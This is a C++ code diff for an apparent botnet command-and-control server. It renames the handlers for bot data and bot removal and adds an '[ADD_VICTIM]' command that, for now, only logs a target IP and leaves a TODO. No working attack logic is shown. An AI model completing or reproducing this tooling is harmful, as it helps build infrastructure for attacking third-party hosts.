@@ -16,10 +16,12 @@ server::server(io::io_context& io_context, std::uint16_t port)
 	     boost::bind(&server::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
 	    {"[INIT]",
 	     boost::bind(&server::handleInit, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
-	    {"[GET_BOTS_DATA]", boost::bind(&server::getClientsData, this, boost::placeholders::_1, boost::placeholders::_2,
+	    {"[GET_BOTS_DATA]", boost::bind(&server::handleGetClientsData, this, boost::placeholders::_1, boost::placeholders::_2,
 					    boost::placeholders::_3)},
-	    {"[DEL_BOT]",
-	     boost::bind(&server::removeClient, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
+	    {"[DEL_BOT]", boost::bind(&server::handleRemoveClient, this, boost::placeholders::_1, boost::placeholders::_2,
+				      boost::placeholders::_3)},
+	    {"[ADD_VICTIM]", boost::bind(&server::handleAddVictim, this, boost::placeholders::_1, boost::placeholders::_2,
+					 boost::placeholders::_3)},
 	};
 }
 
@@ -87,7 +89,7 @@ void server::handleInit(std::string& command, std::vector<std::string>& params, 
 	client->send(msg_parser_.genCommand(command, output_params));
 }
 
-void server::getClientsData(std::string& command, std::vector<std::string>& params, session* client) {
+void server::handleGetClientsData(std::string& command, std::vector<std::string>& params, session* client) {
 	if (!params.size()) return;
 	if (!checkHash_(params[0])) return;
 
@@ -105,7 +107,7 @@ void server::getClientsData(std::string& command, std::vector<std::string>& para
 	client->send(msg_parser_.genCommand(command, output_params));
 }
 
-void server::removeClient(std::string& command, std::vector<std::string>& params, session* client) {
+void server::handleRemoveClient(std::string& command, std::vector<std::string>& params, session* client) {
 	if (params.size() < 2) return;
 	if (!checkHash_(params[0])) return;
 
@@ -126,6 +128,16 @@ void server::removeClient(std::string& command, std::vector<std::string>& params
 			// clients_data_container_.erase(ip);
 		}
 	}
+}
+
+void server::handleAddVictim(std::string& command, std::vector<std::string>& params, session* client) {
+	if (params.size() < 2) return;
+	if (!checkHash_(params[0])) return;
+
+	std::string victim_ip = params[1];
+
+	PRINT("ADDING NEW VICTIM: ", victim_ip);
+    //TODO: add new victim
 }
 
 void server::pingClients() {
